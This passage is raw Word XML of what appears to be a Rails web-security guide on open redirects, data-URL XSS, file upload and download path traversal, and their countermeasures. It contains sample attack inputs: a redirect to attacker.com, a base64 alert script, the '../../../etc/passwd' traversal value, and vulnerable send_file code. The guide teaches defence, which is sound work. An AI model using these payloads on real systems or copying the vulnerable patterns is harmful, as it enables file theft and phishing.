          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> protections</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives the attacker access to all elements on a page, so he can read the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> security token from a form or directly submit the form. Read </w:t>
      </w:r>
      <w:hyperlink r:id="rId702" w:anchor="cross-site-scripting-xss" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">more about </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>XSS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> later.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479A5B8C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 Redirection and Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B6D7B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Another class of security vulnerabilities surrounds the use of redirection and files in web applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7E3065" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Redirection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60134CE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7A65A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Whenever the user is allowed to pass (parts of) the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the web application and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="06EEC423" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="759A9DCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>legacy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47A464B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  redirect_to(params.update(:action=&gt;'main'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08B79C2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="10E73421" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameters to the legacy action and pass them to the main action. However, it can exploited by an attacker if he includes a host key in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7649"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="553BA602" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="10C79F6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9">
            <w:pPr>
              <w:divId w:val="1704285527"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId703" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6C5C8845" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If it is at the end of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>include only the expected parameters in a legacy action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (again a whitelist approach, as opposed to removing unexpected parameters). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">And if you redirect to an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>, check it with a whitelist or a regular expression</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E4AE56" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1 Self-contained </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4400E90A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another redirection and self-contained </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or JavaScript to entire images:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F90FA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD97C03" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, an attacker could redirect to this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the malicious code in it. As a countermeasure, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">do not allow the user to supply (parts of) the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> to be redirected to</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047767EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 File Uploads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DA5A57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Make sure file uploads don’t overwrite important files, and process media files asynchronously.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC8AFBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Many web applications allow users to upload files. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>File names, which the user may choose (partly), should always be filtered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200AFAD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When filtering user input file names, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>don’t try to remove malicious parts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “….//” – the result will be “../”. It is best to use a whitelist approach, which </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn’t a valid file name, reject it (or replace not accepted characters), but don’t remove them. Here is the file name sanitizer from the </w:t>
      </w:r>
      <w:hyperlink r:id="rId704" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:i/>
            <w:iCs/>
          </w:rPr>
          <w:t>attachment_fu plugin</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>fu/tree/master:</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5C09434" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6045FCBE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>sanitize_filename(filename)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77FE01C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  filename.strip.tap do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|name|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="669719B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # NOTE: File.basename doesn't work right with Windows paths on Unix</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DC17271" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # get only the filename, not the whole path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11503C69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    name.sub! /\A.*(\\|\/)/, ''</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E2A3613" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # Finally, replace all non alphanumeric, underscore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44695E01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # or periods with underscore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="194823CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    name.gsub! /[^\w\.\-]/, '_'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F926EB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FADB334" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38025F37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>vulnerability to denial-of-service attacks</w:t>
      </w:r>
      <w:r>
        <w:t>. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0B9007" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The solution to this is best to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>process media files asynchronously</w:t>
      </w:r>
      <w:r>
        <w:t>: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA14E96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Executable Code in File Uploads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43509580" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails’ /public directory if it is Apache’s home directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05843482" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CGI</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> files. Now think of a situation where an attacker uploads a file “file.cgi” with code in it, which will be executed when someone downloads the file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDF0D02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>If your Apache DocumentRoot points to Rails’ /public directory, do not put file uploads in it</w:t>
      </w:r>
      <w:r>
        <w:t>, store files at least one level downwards.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7702DEE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 File Downloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442DB083" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Make sure users cannot download arbitrary files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D969C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5928"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="76DF02A5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5ABBEF7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="192160071"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>send_file('/var/www/uploads/'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+ params[:filename])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64756049" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Simply pass a file name like “../../../etc/passwd” to download the server’s login information. A simple solution against this, is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>check that the requested file is in the expected directory</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5340CBD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05FBC38A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="268931A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>filename = File.expand_path(File.join(basename, @file.public_filename))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7842365E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>basename !=</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F2CB387" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>     File.expand_path(File.join(File.dirname(filename), '../../../'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10F013CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>send_file filename, :disposition</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'inline'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
